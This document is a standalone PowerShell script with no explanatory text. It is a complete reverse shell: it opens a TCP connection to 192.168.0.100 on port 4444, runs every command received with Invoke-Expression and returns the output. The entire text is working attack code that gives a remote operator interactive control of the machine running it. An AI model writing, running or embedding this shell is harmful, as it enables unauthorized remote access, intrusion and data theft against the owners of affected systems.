$LHOST = "192.168.0.100"; $LPORT = 4444; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); 
$StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; 
$Buffer = New-Object System.Byte[] 1024; $StringBuilder = New-Object System.Text.StringBuilder; $StreamWriter.Write("PS> "); while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Chunk = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData); $StringBuilder.Append($Chunk) | Out-Null; if ($Chunk -match "`n") { $Code = $StringBuilder.ToString().Trim(); $StringBuilder.Clear(); 
if ($Code -eq "exit") { break }; $Output = try { Invoke-Expression ($Code) 2>&1 | Out-String } catch { $_.Exception.Message }; $StreamWriter.Write("$Output`rPS> "); $Code = $null } } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()